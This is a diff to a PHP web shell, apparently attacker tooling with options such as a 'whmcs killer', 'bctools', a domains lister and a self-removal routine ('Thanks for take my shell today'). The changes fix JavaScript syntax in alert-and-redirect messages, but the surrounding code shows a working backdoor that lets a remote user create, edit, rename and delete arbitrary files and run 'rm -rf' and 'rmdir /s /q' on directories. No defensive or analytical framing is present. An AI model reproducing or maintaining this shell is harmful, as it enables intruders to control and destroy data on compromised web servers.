@@ -635,7 +635,7 @@ echo "<hr color=deepskyblue>";
 echo "<div id='xkuda_load'></div>";
 if ($_GET['logout'] == true) {
  unset($_SESSION[md5($_SERVER['HTTP_HOST']) ]);
- echo "<script>window.location='?';</script>";
+ echo "<script>alert('See you again');window.location='?';</script>";
 }
 if ($_GET['whmcs'] == 'killer') {
  echo '<form method="post">
@@ -3215,7 +3215,7 @@ elseif ($_GET['do'] == 'bctools') {
  }
 }
 elseif ($_GET['do'] == 'kill') {
- if (@unlink(preg_replace('!(d+)s.*!', '', __FILE__))) die('<center><h3>Shell removed</h3>Goodbye, Thanks for take my shell today</center>');
+ if (@unlink(preg_replace('!(d+)s.*!', '', __FILE__))) die('<script>alert("Shell removed! Thanks for take my shell today");window.location="?"</script>');
  else echo '<center>unlink failed!</center>';
 }
 elseif ($_GET['do'] == 'domains') {
@@ -4569,7 +4569,7 @@ elseif ($_GET['act'] == 'newfile') {
   $newfile = htmlspecialchars($_POST['newfile']);
   $fopen = fopen($newfile, "a+");
   if ($fopen) {
-   $act = "<script>alert('DONE!')window.location.href='?act=edit&dir=" . $dir . "&file=" . $_POST['newfile'] . "';</script>";
+   $act = "<script>alert('DONE!');window.location='?act=edit&dir=" . $dir . "&file=" . $_POST['newfile'] . "';</script>";
   }
   else {
    $act = "<font color=red>permission denied</font>";
@@ -4588,7 +4588,7 @@ elseif ($_GET['act'] == 'newfolder') {
    $act = "<font color=red>permission denied</font>";
   }
   else {
-   $act = "<script>alert('DONE!')window.location.href='?dir=" . $dir . "';</script>";
+   $act = "<script>alert('DONE!');window.location='?dir=" . $dir . "';</script>";
   }
  }
  echo $act;
@@ -4601,7 +4601,7 @@ elseif ($_GET['act'] == 'rename_dir') {
  if ($_POST['dir_rename']) {
   $dir_rename = rename($dir, "" . dirname($dir) . "/" . htmlspecialchars($_POST['fol_rename']) . "");
   if ($dir_rename) {
-   $act = "<script>alert('DONE!')window.location.href='?dir=" . dirname($dir) . "';</script>";
+   $act = "<script>alert('DONE!');window.location='?dir=" . dirname($dir) . "';</script>";
   }
   else {
    $act = "<font color=red>permission denied</font>";
@@ -4619,7 +4619,7 @@ elseif ($_GET['act'] == 'delete_dir') {
    @rmdir($dir);
    @exe("rm -rf $dir");
    @exe("rmdir /s /q $dir");
-   $act = "<script>alert('DONE!')window.location.href='?dir=" . dirname($dir) . "';</script>";
+   $act = "<script>alert('DONE!');window.location='?dir=" . dirname($dir) . "';</script>";
   }
   else {
    $act = "<font color=red>could not remove " . basename($dir) . "</font>";
@@ -4635,7 +4635,7 @@ elseif ($_GET['act'] == 'edit') {
  if ($_POST['save']) {
   $save = file_put_contents($_GET['file'], $_POST['src']);
   if ($save) {
-   $act = "<font color=lime>Saved!</font>";
+   $act = "<script>alert('SAVED!');</script>";
   }
   else {
    $act = "<font color=red>permission denied</font>";
@@ -4652,7 +4652,7 @@ elseif ($_GET['act'] == 'rename') {
  if ($_POST['do_rename']) {
   $rename = rename($_GET['file'], "$dir/" . htmlspecialchars($_POST['rename']) . "");
   if ($rename) {
-   $act = "<script>alert('DONE!')window.location.href='?dir=" . $dir . "';</script>";
+   $act = "<script>alert('DONE!');window.location='?dir=" . $dir . "';</script>";
   }
   else {
    $act = "<font color=red>permission denied</font>";
@@ -4668,7 +4668,7 @@ elseif ($_GET['act'] == 'rename') {
 elseif ($_GET['act'] == 'delete') {
  $delete = unlink($_GET['file']);
  if ($delete) {
-  $act = "<script>alert('DONE!')window.location.href='?dir=" . $dir . "';</script>";
+  $act = "<script>alert('DONE!');window.location='?dir=" . $dir . "';</script>";
  }
  else {
   $act = "<font color=red>permission denied</font>";
